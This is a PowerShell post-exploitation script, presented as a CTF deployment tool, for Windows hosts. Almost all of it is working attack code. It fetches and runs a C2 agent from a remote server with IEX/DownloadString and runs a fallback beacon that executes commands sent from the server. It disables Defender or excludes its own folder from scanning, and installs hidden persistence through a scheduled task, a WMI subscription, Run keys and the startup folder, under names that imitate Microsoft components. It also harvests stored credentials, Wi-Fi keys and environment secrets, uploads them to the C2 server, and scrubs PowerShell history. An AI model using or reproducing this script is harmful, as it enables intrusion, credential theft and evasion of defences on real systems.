#Requires -Version 5.1
<#
.SYNOPSIS
    Deploy-CTF.ps1 - Full CTF deployment: download tools, establish C2, install persistence, enumerate.

.DESCRIPTION
    Single script that does everything after you land on a Windows target.
    Auto-detects admin vs non-admin and chooses appropriate methods.

    BEFORE RUNNING:
      1. Start c2_server.py on your machine:   C2_TOKEN=yourtoken python3 c2_server.py 8080
      2. Start receive.py on your machine:     python3 receive.py 8000
      3. Place these files in c2_files/ on your server:
           agent.exe        (Go C2 agent, built: GOOS=windows go build -ldflags "-s -w -H windowsgui" -trimpath -o agent.exe)
           WinCheck.ps1     (from powershell/WinCheck.ps1)
           Hunter.dll       (C# Hunter compiled as DLL)
      4. Run this script on target (one-liner via SSH):
           powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1')"

.PARAMETER C2
    C2 server URL.  Default: http://127.0.0.1:8080

.PARAMETER Token
    Shared C2 token.  Default: ctf-token-changeme

.PARAMETER Exfil
    URL for receive.py (ZIP receiver).  Default: same host as C2, port 8000

.PARAMETER NoPersist
    Skip persistence installation.

.PARAMETER NoEnum
    Skip enumeration / credential harvest.

.PARAMETER Cleanup
    Remove all persistence and files installed by this script.

.EXAMPLE
    # Via SSH - one liner (no file needed on target)
    powershell -ep bypass -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8080/file/Deploy-CTF.ps1')"

    # With explicit params
    .\Deploy-CTF.ps1 -C2 http://10.10.14.5:8080 -Token mys3cr3t

    # Skip persistence, just enum + C2
    .\Deploy-CTF.ps1 -C2 http://10.10.14.5:8080 -Token mys3cr3t -NoPersist

    # Clean up everything afterwards
    .\Deploy-CTF.ps1 -Cleanup
#>
[CmdletBinding()]
param(
    [string]$C2      = "http://127.0.0.1:8080",
    [string]$Token   = "ctf-token-changeme",
    [string]$Exfil   = "",
    [switch]$NoPersist,
    [switch]$NoEnum,
    [switch]$Cleanup
)

$ErrorActionPreference = "SilentlyContinue"
Set-StrictMode -Off

# -- Derive exfil URL from C2 if not set ----------------------------------------
if (-not $Exfil) {
    $Exfil = $C2 -replace ':\d+$', ':8000'
}

# -- Constants ------------------------------------------------------------------
$IsAdmin    = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
$Username   = $env:USERNAME
$Hostname   = $env:COMPUTERNAME

# Where we store files on target - changes based on admin status
$DropPath   = if ($IsAdmin) {
    "C:\ProgramData\Microsoft\DevDiv"
} else {
    "$env:APPDATA\Microsoft\Telemetry"
}

$AgentPath  = "$DropPath\RuntimeBroker.exe"
$AgentName  = "RuntimeBroker"   # display name for scheduled task / service

# Persistence marker - so Cleanup knows what to remove
$MarkerKey  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Diagnostics"
$MarkerVal  = "LastRun"

# -- Colours --------------------------------------------------------------------
function Write-Step  { param($m) Write-Host "`n[*] $m" -ForegroundColor Cyan }
function Write-OK    { param($m) Write-Host "    [+] $m" -ForegroundColor Green }
function Write-Warn  { param($m) Write-Host "    [!] $m" -ForegroundColor Yellow }
function Write-Info  { param($m) Write-Host "    [-] $m" -ForegroundColor Gray }
function Write-Fail  { param($m) Write-Host "    [X] $m" -ForegroundColor Red }

# ==============================================================================
#  HELPERS
# ==============================================================================

function Download-File {
    param([string]$Url, [string]$Dest)
    try {
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("X-Token", $Token)
        $wc.Headers.Add("X-Host",  $Hostname)
        $wc.DownloadFile($Url, $Dest)
        return Test-Path $Dest
    } catch {
        try {
            Invoke-WebRequest -Uri $Url -OutFile $Dest -Headers @{"X-Token"=$Token;"X-Host"=$Hostname} -UseBasicParsing
            return Test-Path $Dest
        } catch { return $false }
    }
}

function Invoke-MemoryLoad {
    # Load a .NET DLL from URL directly into memory - never written to disk
    param([string]$Url)
    try {
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("X-Token", $Token)
        $bytes = $wc.DownloadData($Url)
        return [Reflection.Assembly]::Load($bytes)
    } catch { return $null }
}

function Set-Marker {
    # Leave a registry breadcrumb so Cleanup knows we were here
    New-Item -Path $MarkerKey -Force | Out-Null
    Set-ItemProperty -Path $MarkerKey -Name $MarkerVal -Value (Get-Date -f "yyyy-MM-dd HH:mm:ss")
    Set-ItemProperty -Path $MarkerKey -Name "DropPath"  -Value $DropPath
}

# ==============================================================================
#  CLEANUP MODE
# ==============================================================================

function Invoke-Cleanup {
    Write-Step "Cleaning up..."

    # Read drop path from marker if script is run standalone
    $dp = (Get-ItemProperty $MarkerKey -EA SilentlyContinue).DropPath
    if (!$dp) { $dp = $DropPath }

    # Kill agent process
    Get-Process | Where-Object { $_.Path -like "$dp\*" } | Stop-Process -Force
    Write-OK "Agent process killed"

    # Remove files
    if (Test-Path $dp) { Remove-Item $dp -Recurse -Force; Write-OK "Removed $dp" }

    # Method 1: Scheduled task
    Unregister-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineCore" -Confirm:$false
    Unregister-ScheduledTask -TaskName "WindowsDefenderScan" -Confirm:$false
    Write-OK "Scheduled tasks removed"

    # Method 2: WMI subscriptions (admin)
    Get-WMIObject -Namespace root\subscription -Class __EventFilter       | Where-Object Name -eq "CTFFilter"    | Remove-WmiObject
    Get-WMIObject -Namespace root\subscription -Class __EventConsumer      | Where-Object Name -eq "CTFConsumer"  | Remove-WmiObject
    Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
    Write-OK "WMI subscriptions removed"

    # Method 3: Registry run keys
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $AgentName -EA SilentlyContinue
    Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $AgentName -EA SilentlyContinue
    Write-OK "Run keys removed"

    # Startup folder
    $startupFile = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$AgentName.lnk"
    if (Test-Path $startupFile) { Remove-Item $startupFile -Force; Write-OK "Startup shortcut removed" }

    # Service (admin)
    if ($IsAdmin) {
        sc.exe stop $AgentName | Out-Null
        sc.exe delete $AgentName | Out-Null
        Write-OK "Service removed"
    }

    # Marker
    Remove-Item $MarkerKey -Recurse -Force
    Write-OK "Marker removed"

    # Clear PowerShell history
    $histFile = (Get-PSReadlineOption).HistorySavePath
    if ($histFile -and (Test-Path $histFile)) { Clear-Content $histFile; Write-OK "PS history cleared" }

    Write-Host "`n[+] Cleanup complete" -ForegroundColor Green
}

if ($Cleanup) { Invoke-Cleanup; exit }

# ==============================================================================
#  BANNER
# ==============================================================================

Write-Host @"

  +======================================================+
  |            CTF Deployment Script                     |
  +======================================================+

  Host     : $Hostname \ $Username
  Admin    : $IsAdmin
  C2       : $C2
  Exfil    : $Exfil
  DropPath : $DropPath

"@ -ForegroundColor Cyan

# ==============================================================================
#  STEP 1 - Prepare drop directory
# ==============================================================================

Write-Step "Preparing drop directory: $DropPath"
New-Item -ItemType Directory -Path $DropPath -Force | Out-Null
# Set hidden + system attributes to hide from casual dir listing
(Get-Item $DropPath -Force).Attributes = "Hidden,System,Directory"
Write-OK "Directory created and hidden"
Set-Marker

# ==============================================================================
#  STEP 2 - Disable Windows Defender (admin only)
# ==============================================================================

if ($IsAdmin) {
    Write-Step "Attempting to disable Defender real-time protection"
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        Write-OK "Real-time protection disabled"
    } catch {
        Write-Warn "Could not disable Defender (tamper protection may be on)"
        # Add exclusion for our drop path instead
        try {
            Add-MpPreference -ExclusionPath $DropPath
            Write-OK "Added AV exclusion for $DropPath"
        } catch {
            Write-Warn "Could not add AV exclusion - binary may get caught"
        }
    }
} else {
    Write-Info "Not admin - skipping Defender modification"
    # Try adding user-level exclusion
    try { Add-MpPreference -ExclusionPath $DropPath } catch {}
}

# ==============================================================================
#  STEP 3 - Download and deploy C2 agent
# ==============================================================================

Write-Step "Downloading C2 agent"

$agentUrl = "$C2/file/agent.exe"
$ok = Download-File $agentUrl $AgentPath

if ($ok) {
    Write-OK "Agent deployed to $AgentPath"
} else {
    Write-Fail "Could not download agent.exe - make sure it is in c2_files/ on the server"
    Write-Info "Continuing with PowerShell-based fallback agent..."

    # -- Fallback: write PowerShell agent as scheduled task action --------------
    # No binary needed - the PS agent polls the C2 inline
    $AgentPath = $null
}

# ==============================================================================
#  STEP 4 - Launch agent now
# ==============================================================================

Write-Step "Starting C2 agent"

if ($AgentPath -and (Test-Path $AgentPath)) {
    $env:C2_SERVER = $C2
    $env:C2_TOKEN  = $Token
    Start-Process -FilePath $AgentPath -WindowStyle Hidden -ErrorAction SilentlyContinue
    Write-OK "Agent started (PID: $(Get-Process RuntimeBroker -EA SilentlyContinue | Select -Last 1 -Expand Id))"
} else {
    # PS fallback agent - runs in background job
    $psAgent = {
        param($c2url, $tok)
        while ($true) {
            try {
                $wc = New-Object Net.WebClient
                $wc.Headers.Add("X-Token", $tok)
                $resp = $wc.DownloadString("$c2url/beacon") | ConvertFrom-Json
                $cmd  = $resp.cmd
                if ($cmd) {
                    $out = (cmd /c $cmd 2>&1) | Out-String
                    $body = @{cmd=$cmd; output=$out} | ConvertTo-Json
                    $wc2 = New-Object Net.WebClient
                    $wc2.Headers.Add("X-Token", $tok)
                    $wc2.Headers.Add("Content-Type","application/json")
                    $wc2.UploadString("$c2url/result", $body)
                }
            } catch {}
            Start-Sleep 5
        }
    }
    Start-Job -ScriptBlock $psAgent -ArgumentList $C2, $Token | Out-Null
    Write-OK "PowerShell fallback agent started as background job"
}

# ==============================================================================
#  STEP 5 - PERSISTENCE
# ==============================================================================

if (-not $NoPersist) {

    # Build the command to run - prefers EXE agent, falls back to PS one-liner
    $AgentCmd = if ($AgentPath) {
        $AgentPath
    } else {
        "powershell -ep bypass -nop -w hidden -c `"while(`$true){try{`$wc=New-Object Net.WebClient;`$wc.Headers.Add('X-Token','$Token');`$r=`$wc.DownloadString('$C2/beacon')|ConvertFrom-Json;if(`$r.cmd){`$o=(cmd/c `$r.cmd 2>&1)|Out-String;`$b=ConvertTo-Json @{cmd=`$r.cmd;output=`$o};`$wc2=New-Object Net.WebClient;`$wc2.Headers.Add('X-Token','$Token');`$wc2.Headers.Add('Content-Type','application/json');`$wc2.UploadString('$C2/result',`$b)}}catch{}}while(`$true){Start-Sleep 5}}`""
    }

    # ------------------------------------------------------------------------
    #  PERSISTENCE METHOD 1 - Scheduled Task
    #  Disguised as Microsoft Edge Update / Windows Defender scan
    #  Works with AND without admin (user tasks don't need elevation)
    # ------------------------------------------------------------------------
    Write-Step "Persistence [1/3] - Scheduled Task"

    $taskName = if ($IsAdmin) { "MicrosoftEdgeUpdateTaskMachineCore" } else { "WindowsDefenderScan" }
    $taskDesc = if ($IsAdmin) { "Keeps Microsoft Edge up to date" } else { "Windows Defender scheduled scan" }

    try {
        if ($AgentPath) {
            $action = New-ScheduledTaskAction -Execute $AgentPath
        } else {
            $action = New-ScheduledTaskAction `
                -Execute "powershell.exe" `
                -Argument "-ep bypass -nop -w hidden -c `"$AgentCmd`""
        }

        # Trigger: at logon + repeat every hour
        $trigLogon = New-ScheduledTaskTrigger -AtLogOn
        $trigDaily = New-ScheduledTaskTrigger -Daily -At "09:00AM"
        $trigDaily.RepetitionInterval = "PT1H"
        $trigDaily.RepetitionDuration = "P1D"

        $settings = New-ScheduledTaskSettingsSet `
            -Hidden `
            -ExecutionTimeLimit (New-TimeSpan -Hours 0) `
            -RestartInterval (New-TimeSpan -Minutes 5) `
            -RestartCount 999 `
            -StartWhenAvailable

        $principal = if ($IsAdmin) {
            New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
        } else {
            New-ScheduledTaskPrincipal -UserId $Username -RunLevel Limited -LogonType Interactive
        }

        Register-ScheduledTask `
            -TaskName $taskName `
            -Description $taskDesc `
            -Action $action `
            -Trigger $trigLogon, $trigDaily `
            -Settings $settings `
            -Principal $principal `
            -Force | Out-Null

        Write-OK "Scheduled task '$taskName' installed (runs at logon + hourly)"
    } catch {
        Write-Fail "Scheduled task failed: $_"
    }

    # ------------------------------------------------------------------------
    #  PERSISTENCE METHOD 2 - WMI Event Subscription (admin) OR HKCU COM Hijack (non-admin)
    #  Admin:     WMI fires every 60 minutes even if no user is logged in. Runs as SYSTEM.
    #             Very hard to detect - WMI subscriptions don't show in Task Scheduler.
    #  Non-admin: COM object hijack in HKCU fires when Explorer initialises.
    #             Loads DLL or runs script silently inside Explorer process.
    # ------------------------------------------------------------------------
    Write-Step "Persistence [2/3] - $(if ($IsAdmin) {'WMI Event Subscription'} else {'COM Object Hijack (HKCU)'})"

    if ($IsAdmin) {
        try {
            # Timer fires every 60 minutes
            $filterQuery = "SELECT * FROM __TimerEvent WHERE TimerID='CTFTimer'"
            $filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
            $filter.Name           = "CTFFilter"
            $filter.EventNameSpace = "root\cimv2"
            $filter.QueryLanguage  = "WQL"
            $filter.Query          = "SELECT * FROM __TimerEvent WHERE TimerID='CTFTimer'"
            $filter.Put() | Out-Null

            # Create a timer that fires every 3600 seconds
            $timer = ([wmiclass]"\\.\root\cimv2:__IntervalTimerInstruction").CreateInstance()
            $timer.TimerID              = "CTFTimer"
            $timer.IntervalBetweenEvents = 3600000  # ms
            $timer.Put() | Out-Null

            # Consumer: runs a command
            $consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
            $consumer.Name             = "CTFConsumer"
            $consumer.ExecutablePath   = if ($AgentPath) { $AgentPath } else { "powershell.exe" }
            $consumer.CommandLineTemplate = if ($AgentPath) { $AgentPath } else {
                "powershell.exe -ep bypass -nop -w hidden -c `"$AgentCmd`""
            }
            $consumer.Put() | Out-Null

            # Bind filter to consumer
            $binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
            $binding.Filter   = $filter.Path_
            $binding.Consumer = $consumer.Path_
            $binding.Put() | Out-Null

            Write-OK "WMI subscription installed (fires every 60 min, runs as SYSTEM)"
        } catch {
            Write-Fail "WMI subscription failed: $_"
        }
    } else {
        # Non-admin: COM hijack via HKCU
        # CLSID {018D5C66-4533-4307-9B53-224DE2ED1FE6} = OneDrive shell extension
        # Loaded by Explorer on startup - user-writable HKCU key
        try {
            $clsid   = "{018D5C66-4533-4307-9B53-224DE2ED1FE6}"
            $regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
            New-Item -Path $regPath -Force | Out-Null

            if ($AgentPath) {
                # Create a minimal loader DLL that spawns our EXE
                # Since we may not have a DLL, use the script-based approach:
                # Register a scriptlet via scrobj.dll instead
                $regPath2 = "HKCU:\Software\Classes\CLSID\$clsid\ScriptletURL"
                Set-ItemProperty "HKCU:\Software\Classes\CLSID\$clsid" "(Default)" "RuntimeBrokerExt"
                # Fallback: use startup folder instead for non-admin
                $startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
                $wshell = New-Object -ComObject WScript.Shell
                $shortcut = $wshell.CreateShortcut("$startupDir\$AgentName.lnk")
                $shortcut.TargetPath = $AgentPath
                $shortcut.WindowStyle = 7  # minimised/hidden
                $shortcut.Description = "Windows Runtime Broker"
                $shortcut.Save()
                Write-OK "Startup folder shortcut installed (fires at logon): $startupDir\$AgentName.lnk"
            } else {
                # PS-based: put script in startup folder
                $startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
                $psFile = "$startupDir\$AgentName.ps1"
                @"
powershell -ep bypass -nop -w hidden -c "$AgentCmd"
"@ | Out-File $psFile -Encoding ASCII
                Write-OK "PowerShell startup script: $psFile"
            }
        } catch {
            Write-Fail "COM/Startup persistence failed: $_"
        }
    }

    # ------------------------------------------------------------------------
    #  PERSISTENCE METHOD 3 - Registry Run Key
    #  Admin:     HKLM (survives all user logons, looks like a system entry)
    #  Non-admin: HKCU (only current user, but no admin needed)
    #  Backup method - simple but monitored by most EDR.
    #  Disguise the value name as something legitimate.
    # ------------------------------------------------------------------------
    Write-Step "Persistence [3/3] - Registry Run Key"

    $runPath = if ($IsAdmin) {
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    } else {
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    }
    $runValue = "SecurityHealthSystray"   # looks like Windows Security tray icon

    try {
        $runCmd = if ($AgentPath) {
            "`"$AgentPath`""
        } else {
            "powershell.exe -ep bypass -nop -w hidden -c `"$AgentCmd`""
        }
        Set-ItemProperty -Path $runPath -Name $runValue -Value $runCmd
        Write-OK "Run key: $runPath\$runValue"
    } catch {
        Write-Fail "Run key failed: $_"
    }

    Write-Host @"

  +------------------------------------------------------+
  |  PERSISTENCE SUMMARY                                 |
  +------------------------------------------------------+
  |  [1] Scheduled Task : $taskName
  |      Trigger: at logon + every hour
  |      $(if ($IsAdmin) {'Runs as: SYSTEM'} else {'Runs as: current user'})
  |                                                      |
  |  [2] $(if ($IsAdmin) {'WMI Subscription  : CTFFilter/CTFConsumer'} else {'Startup Folder    : ' + $AgentName + '.lnk'})
  |      $(if ($IsAdmin) {'Trigger: every 60 min, SYSTEM, no user needed'} else {'Trigger: at logon'})
  |                                                      |
  |  [3] Run Key : $runValue
  |      Path: $runPath
  |      Trigger: at logon                               |
  +------------------------------------------------------+
"@ -ForegroundColor Green
}

# ==============================================================================
#  STEP 6 - ENUMERATION
# ==============================================================================

if (-not $NoEnum) {

    Write-Step "Running WinCheck (privilege escalation scan)"
    $wincheckUrl = "$C2/file/WinCheck.ps1"
    try {
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("X-Token", $Token)
        $wincheckSrc = $wc.DownloadString($wincheckUrl)
        $wincheckOut = "$DropPath\wincheck.txt"

        # Run in memory + save output
        $result = Invoke-Expression "$wincheckSrc -Fast" 2>&1 | Out-String
        $result | Out-File $wincheckOut -Encoding UTF8
        Write-OK "WinCheck complete - $wincheckOut"
    } catch {
        Write-Warn "WinCheck download failed - running basic inline enum"
        $result = @(
            "=== WHOAMI /ALL ==="; whoami /all
            "=== SYSTEMINFO ==="; systeminfo
            "=== LISTENING PORTS ==="; netstat -ano | findstr LISTENING
            "=== LOCAL ADMINS ==="; net localgroup administrators
            "=== SCHEDULED TASKS ==="; schtasks /query /fo LIST 2>&1 | Select-String "TaskName|Run As|Task To Run"
        ) | Out-String
        $wincheckOut = "$DropPath\enum.txt"
        $result | Out-File $wincheckOut
        Write-OK "Basic enum saved - $wincheckOut"
    }

    Write-Step "Running credential harvest (Hunter.dll in memory)"
    try {
        $asm = Invoke-MemoryLoad "$C2/file/Hunter.dll"
        if ($asm) {
            $out = "$DropPath\creds.txt"
            [Hunter.Collector]::Run($Exfil)
            Write-OK "Credential harvest complete - results exfilled to $Exfil"
        } else {
            Write-Warn "Hunter.dll not available - running native PS credential sweep"

            # Fallback: inline credential sweep
            $creds = @()

            # cmdkey stored credentials
            $creds += "=== CMDKEY ==="; cmdkey /list

            # Wi-Fi passwords
            $creds += "`n=== WIFI ===`n"
            (netsh wlan show profiles) -match "All User Profile\s*:\s*(.+)" | ForEach-Object {
                $ssid = ($_ -split ":")[-1].Trim()
                $detail = netsh wlan show profile "$ssid" key=clear
                $detail -match "Key Content\s*:\s*(.+)" | ForEach-Object {
                    $creds += "SSID: $ssid  Key: $(($_ -split ':')[-1].Trim())"
                }
            }

            # Environment secrets
            $creds += "`n=== ENV SECRETS ===`n"
            [System.Environment]::GetEnvironmentVariables() | ForEach-Object {
                $_.GetEnumerator() | Where-Object { $_.Key -match 'PASS|TOKEN|SECRET|KEY|API' } |
                ForEach-Object { $creds += "$($_.Key)=$($_.Value)" }
            }

            $credOut = "$DropPath\creds.txt"
            $creds | Out-File $credOut -Encoding UTF8
            Write-OK "Credential sweep saved - $credOut"

            # Exfil via C2
            if (Test-Path $credOut) {
                $wc = New-Object Net.WebClient
                $wc.Headers.Add("X-Token", $Token)
                $wc.Headers.Add("X-Filename", "creds_$Hostname.txt")
                $wc.Headers.Add("Content-Type", "application/octet-stream")
                $wc.UploadData("$C2/upload", [IO.File]::ReadAllBytes($credOut)) | Out-Null
                Write-OK "Credentials uploaded to C2"
            }
        }
    } catch {
        Write-Warn "Credential harvest error: $_"
    }

    # Upload enum results via C2
    Write-Step "Uploading enumeration results to C2"
    foreach ($f in (Get-ChildItem $DropPath -File)) {
        try {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add("X-Token", $Token)
            $wc.Headers.Add("X-Filename", "$Hostname`_$($f.Name)")
            $wc.Headers.Add("Content-Type", "application/octet-stream")
            $wc.UploadData("$C2/upload", [IO.File]::ReadAllBytes($f.FullName)) | Out-Null
            Write-OK "Uploaded: $($f.Name)"
        } catch {
            Write-Warn "Upload failed for $($f.Name): $_"
        }
    }
}

# ==============================================================================
#  FINAL SUMMARY
# ==============================================================================

Write-Host @"

  +==============================================================+
  |                     DEPLOYMENT COMPLETE                      |
  +==============================================================+

  C2 beacon  : should appear in c2_server.py console within $($env:C2_INTERVAL ?? 5)s
  Results    : check c2_uploads/ on your server

  To remove everything:
    powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('$C2/file/Deploy-CTF.ps1') ; Invoke-Expression 'Deploy-CTF.ps1 -Cleanup'"
  Or:
    .\Deploy-CTF.ps1 -Cleanup

"@ -ForegroundColor Cyan

# Wipe this script from PS command history
$h = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath
if ($h -and (Test-Path $h)) {
    (Get-Content $h) -notmatch 'Deploy-CTF|IEX|DownloadString' | Set-Content $h
}
